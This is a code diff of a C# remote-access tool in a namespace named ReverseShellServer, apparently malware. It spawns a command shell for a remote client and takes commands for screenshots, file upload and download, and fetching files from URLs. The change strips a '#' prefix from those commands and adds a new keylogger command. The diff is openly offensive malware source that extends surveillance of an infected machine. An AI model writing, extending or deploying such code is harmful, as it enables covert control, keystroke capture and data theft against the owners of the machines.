@@ -17,14 +17,14 @@ namespace ReverseShellServer
         BinaryReader binaryReader;
         Process processCmd;
         StringBuilder strInput;
-
+        
         ServerTools tools;
 
 
         public ServerManager()
         {
             // Only one instance can run, random string identifier
-            var mutex = new Mutex(false, "ThisIsMyMutex-2JUY34DE8E23D9");
+            var mutex = new Mutex(false, "ThisIsMyMutex-2JUY34DE8E23D7");
             if (!mutex.WaitOne(TimeSpan.Zero, true))
             {
                 Environment.Exit(0);
@@ -60,7 +60,7 @@ namespace ReverseShellServer
                 }
                 catch (Exception) { return; } // if no Client, don't continue 
 
-                tools = new ServerTools(binaryWriter, binaryReader, streamWriter, streamReader);
+                tools = new ServerTools(binaryWriter, binaryReader, streamWriter);
 
                 processCmd = new Process
                 {
@@ -101,7 +101,7 @@ namespace ReverseShellServer
         {
             var command = strInput.ToString().Split(' ');
             var bypassHello = false;
-
+            
             switch (command[0])
             {
                 case "terminate":
@@ -109,17 +109,20 @@ namespace ReverseShellServer
                     break;
                 case "exit":
                     throw new ArgumentException();
-                case "#screenshot":
+                case "screenshot":
                     tools.TakeAndSendScreenShotToClient();
                     break;
-                case "#downloadurl":
+                case "downloadurl":
                     tools.DownloadFileFromUrl(command[1]);
                     break;
-                case "#download":
+                case "download":
                     tools.UploadFileToClient(command[1]);
                     break;
-                case "#upload":
+                case "upload":
                     tools.ReceiveFileFromClient(command[1]);
+                    break;
+                case "keylogger":
+                    tools.ProcessKeyloggerCommand(command[1]);
                     break;
                 default:
                     strInput.Append("\n");
